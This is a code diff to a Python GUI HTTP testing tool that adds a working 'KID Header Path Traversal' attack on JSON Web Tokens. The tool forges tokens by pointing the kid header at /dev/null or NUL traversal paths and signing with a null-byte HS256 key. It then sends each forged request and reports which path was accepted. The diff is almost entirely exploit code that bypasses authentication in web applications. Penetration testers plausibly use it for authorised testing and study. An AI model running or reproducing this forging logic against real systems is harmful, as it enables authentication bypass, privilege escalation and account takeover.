@@ -485,6 +485,9 @@ class HTTPRequestTool:
         self.jwk_injection_var = tk.BooleanVar()
         ttk.Checkbutton(attack_frame, text="JWK Header Injection", variable=self.jwk_injection_var).pack(anchor=tk.W, pady=5)
         
+        self.kid_traversal_var = tk.BooleanVar()
+        ttk.Checkbutton(attack_frame, text="KID Header Path Traversal", variable=self.kid_traversal_var).pack(anchor=tk.W, pady=5)
+        
         # Add button to manage secrets list
         ttk.Button(attack_frame, text="Manage Secrets List", command=self.manage_secrets_list).pack(pady=5)
         
@@ -541,6 +544,8 @@ class HTTPRequestTool:
             self.perform_brute_force_attack()
         if self.jwk_injection_var.get():
             self.perform_jwk_injection_attack()
+        if self.kid_traversal_var.get():
+            self.perform_kid_traversal_attack()
         attack_window.destroy()
 
     def perform_unverified_signature_attack(self):
@@ -894,6 +899,118 @@ class HTTPRequestTool:
             
         except Exception as e:
             messagebox.showerror("Error", f"Failed to perform JWK Header Injection attack: {str(e)}")
+
+    def perform_kid_traversal_attack(self):
+        # Get the current request text
+        request_text = self.request_text.get("1.0", tk.END).strip()
+        
+        # Find JWT tokens in the request
+        jwt_tokens = self.find_jwt(request_text)
+        if not jwt_tokens:
+            messagebox.showerror("Error", "No JWT tokens found in request")
+            return
+        
+        # Get the first JWT token
+        original_token = jwt_tokens[0]
+        
+        try:
+            # Decode the JWT without verification
+            header = jwt.get_unverified_header(original_token)
+            payload = jwt.decode(original_token, options={"verify_signature": False})
+            
+            # Create a window for editing the payload
+            edit_window = tk.Toplevel(self.root)
+            edit_window.title("Edit JWT Payload")
+            edit_window.geometry("600x400")
+            
+            # Create text area for payload
+            payload_frame = ttk.LabelFrame(edit_window, text="JWT Payload")
+            payload_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+            
+            payload_text = tk.Text(payload_frame, wrap=tk.WORD)
+            payload_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            
+            # Add scrollbar
+            scrollbar = ttk.Scrollbar(payload_text)
+            scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+            payload_text.config(yscrollcommand=scrollbar.set)
+            scrollbar.config(command=payload_text.yview)
+            
+            # Insert current payload
+            payload_text.insert("1.0", json.dumps(payload, indent=2))
+            
+            def continue_attack():
+                try:
+                    # Get edited payload
+                    edited_payload = json.loads(payload_text.get("1.0", tk.END).strip())
+                    
+                    # Try different null device paths
+                    null_paths = [
+                        "../../../../../../../dev/null",  # Unix/Linux/macOS
+                        "..\\..\\..\\..\\..\\..\\..\\NUL",  # Windows
+                        "../../../../../../../dev/null/",  # With trailing slash
+                        "..\\..\\..\\..\\..\\..\\..\\NUL\\"  # Windows with trailing slash
+                    ]
+                    
+                    success = False
+                    successful_path = None
+                    
+                    for path in null_paths:
+                        # Create a new header with the current path
+                        new_header = header.copy()
+                        new_header["kid"] = path
+                        
+                        # Create a new token with the modified header and payload
+                        # Using a null byte as the secret key (AA== in base64)
+                        null_key = base64.b64decode("AA==")
+                        modified_token = jwt.encode(
+                            edited_payload,
+                            null_key,
+                            algorithm="HS256",
+                            headers=new_header
+                        )
+                        
+                        # Replace the original token in the request
+                        modified_request = request_text.replace(original_token, modified_token)
+                        
+                        # Send the modified request
+                        self.request_text.delete("1.0", tk.END)
+                        self.request_text.insert("1.0", modified_request)
+                        self.process_request()
+                        
+                        # Get the response status code from the response text
+                        response_text = self.response_text.get("1.0", tk.END)
+                        status_line = response_text.split('\n')[0]
+                        try:
+                            status_code = int(status_line.split()[1])
+                        except (IndexError, ValueError):
+                            status_code = 0
+                        
+                        # If we get a success response, keep this path
+                        if status_code < 400:
+                            success = True
+                            successful_path = path
+                            break
+                    
+                    if success:
+                        messagebox.showinfo("Attack Result", f"KID Header Path Traversal Attack: ✅ SUCCESS\nSuccessful path: {successful_path}")
+                    else:
+                        messagebox.showinfo("Attack Result", "KID Header Path Traversal Attack: ❌ FAILED\nAll paths failed")
+                    
+                    edit_window.destroy()
+                    
+                except json.JSONDecodeError:
+                    messagebox.showerror("Error", "Invalid JSON in payload. Please fix the JSON format.")
+                except Exception as e:
+                    messagebox.showerror("Error", f"Failed to perform KID Header Path Traversal attack: {str(e)}")
+                    edit_window.destroy()
+            
+            # Add continue button
+            continue_button = ttk.Button(edit_window, text="Continue Attack", command=continue_attack)
+            continue_button.pack(pady=10)
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to perform KID Header Path Traversal attack: {str(e)}")
 
     def edit_jwt(self):
         # Get the current JWT content
